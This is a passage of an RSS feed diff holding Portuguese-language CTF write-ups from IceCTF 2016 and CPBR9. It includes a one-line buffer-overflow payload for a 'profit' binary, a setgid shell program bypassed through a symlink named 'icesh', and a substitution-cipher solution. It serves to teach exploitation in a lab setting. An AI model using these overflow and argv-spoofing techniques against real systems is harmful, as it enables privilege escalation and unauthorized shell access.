+IceCTF&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;who_would_have_thunk?&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1]    21322 &lt;span class=&quot;k&quot;&gt;done                          &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;A&quot; * 76 + &quot;\x0b\x85\x04\x08&quot;&apos;&lt;/span&gt; | 
+       21324 illegal hardware instruction  ./profit
+IceCTF&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;who_would_have_thunk?&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Flag:&lt;/strong&gt; IceCTF{who_would_have_thunk?}&lt;/p&gt;
+</description>
+        <pubDate>Fri, 12 Aug 2016 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000/2016/Smashing-Profit-IceCTF-2016</link>
+        <guid isPermaLink="true">http://localhost:4000/2016/Smashing-Profit-IceCTF-2016</guid>
+        
+        <category>IceCTF</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Demo (55 pts - stage 2) - IceCTF 2016</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;CTF:&lt;/strong&gt; IceCTF 2016&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Challenge:&lt;/strong&gt; Demo (55 pts - stage 2)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwn&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Solved by:&lt;/strong&gt; RTFM[ChOkO]&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Description: I found this awesome premium shell, but my demo version just ran out… can you help me crack it? /home/demo/ on the shell  &lt;br /&gt;
+&lt;em&gt;**&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ao conectar na webshell do IceCTF navegamos ao diretório /home/demo e encontramos o arquivo demo.c, a seguir:&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define _GNU_SOURCE
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;libgen.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;give_shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;basename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;icesh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;give_shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;I&apos;m sorry, your free trial has ended.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A resolução é bem direta: Basta criar um diretório temporário e um link simbólico para o arquivo /home/demo/demo com o nome esperado na comparação (icesh):&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /home/demo/demo icesh
+./icesh
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/demo/flag.txt &lt;span class=&quot;c&quot;&gt;# \o/&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Flag:&lt;/em&gt; IceCTF{wH0_WoU1d_3vr_7Ru5t_4rgV}&lt;/p&gt;
+</description>
+        <pubDate>Fri, 12 Aug 2016 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000/2016/DEMO-PWN-ICECTF-2016</link>
+        <guid isPermaLink="true">http://localhost:4000/2016/DEMO-PWN-ICECTF-2016</guid>
+        
+        <category>IceCTF</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>CPBR9 - 1 day 1 chall - Watson (Crypto)</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;CTF:&lt;/strong&gt; CPBR9 - 1 day 1 chall&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Challenge:&lt;/strong&gt; Day 2 - Watson&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Category:&lt;/strong&gt; Crypto&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Author:&lt;/strong&gt; gnx&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Solved by:&lt;/strong&gt; RTFM[ChOkO]&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Description: &lt;em&gt;Qpcihz… pacyjpehi h pavhjoceh fh glos fh KWO gly iy yzmhzcjp ye xccd://qqq.kwo.vhb/zyqi/ichjoyi/2008/fymyewyj/mhfy_122908, y ipol yiip kjpiy fhofp, gly y’ p kapv. Dtcxhz whewp!&lt;/em&gt;&lt;br /&gt;
+&lt;em&gt;**&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Trata-se de uma mensagem criptografada. Aparentemente existe um endereço de uma página web: xccd://qqq.kwo.vhb/zyqi/ichjoyi/2008/fymyewyj/mhfy_122908. Então começamos a analisar utilizando algumas “colas”:&lt;/p&gt;
+
+&lt;p&gt;`* X=h&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;C=t&lt;/li&gt;
+  &lt;li&gt;D=p&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Q=w`&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Ciphertext: ABCDEFGHIJKLMNOPQRSTUVWXYZ&lt;/li&gt;
+  &lt;li&gt;Plaintext:   ??tp???????????????w????????h??&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Realizando as substituições acima, temos:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wPtIHZ… PAtYJPEHI H PAVHJOtEH FH GLOS FH KWO GLY IY YZMHZtJP YE http://www.KWO.VHB/ZYwI/ItHJOYI/2008/FYMYEWYJ/MHFY_122908, Y IPOL YIIP KJPIY FHOFP, GLY Y’ P KAPV. pTthHZ WHEWP!&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Ainda não é o suficiente para quebrarmos esta frase secreta. Para ter uma idéia mais concreta do que pode ser, utilizamos o site &lt;a href=&quot;http://www.quipqiup.com/index.php&quot;&gt;http://www.quipqiup.com/index.php&lt;/a&gt; que é excelente para resolver criptogramas e para nossa surpresa conseguimos descobrir a primeira palavra: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Watson!&lt;/code&gt;
+&lt;img src=&quot;https://ctf-br.org/wp-content/uploads/2016/02/day02_watson.png&quot; alt=&quot;Day2_Watson&quot; title=&quot;Day 2 - Watson&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Então sabemos que &lt;strong&gt;Qpcihz&lt;/strong&gt; é o nome do nosso caro &lt;strong&gt;“Watson”&lt;/strong&gt;. Reparamos que o endereço da página também ficou mais compreensível, descobrimos as palavras &lt;strong&gt;“news”&lt;/strong&gt; e &lt;strong&gt;“stories”&lt;/strong&gt;! Isto nos permite adicionar mais pistas, então vamos substituir com tudo que encontramos até o momento:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Watson… aAteraEos o aAVoritEo Fo GLiS Fo KWi GLe se enMontra eE http://www.KWi.VoB/news/stories/2008/FeMeEWer/MoFe_122908, e saiL essa Krase FoiFa, GLe e‘ a KAaV. pTthon WoEWa!&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;A frase ficou muito mais clara. Com um pouco de dedução conseguimos matar outras palavras, por exemplo:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;“enMontra” = “encontra”&lt;/li&gt;
+  &lt;li&gt;“saiL” = “saiu”&lt;/li&gt;
+  &lt;li&gt;“Krase” = “frase”&lt;/li&gt;
+  &lt;li&gt;“FoiFa” = “doida”&lt;/li&gt;
+  &lt;li&gt;“pTthon” = “python”&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Watson… aAteraEos o aAVoritEo do GLiS do KWi GLe se encontra eE http://www.KWi.VoB/news/stories/2008/FeMeEWer/MoFe_122908, e saiu essa frase doida, GLe e‘ a KAaV. python WoEWa!&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Finalizamos o processo e descobrimos que a flag era a frase completa!&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;FLAG: Watson… alteramos o algoritmo do quiz do FBI que se encontra em http://www.fbi.gov/news/stories/2008/december/code_122908, e saiu essa frase doida, que e’ a flag. Python bomba!&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Wed, 27 Jan 2016 00:00:00 -0200</pubDate>
+        <link>http://localhost:4000/2016/WATSON-CPBR9-2016</link>
+        <guid isPermaLink="true">http://localhost:4000/2016/WATSON-CPBR9-2016</guid>
+        
+        <category>CPBR9</category>
         
         
       </item>
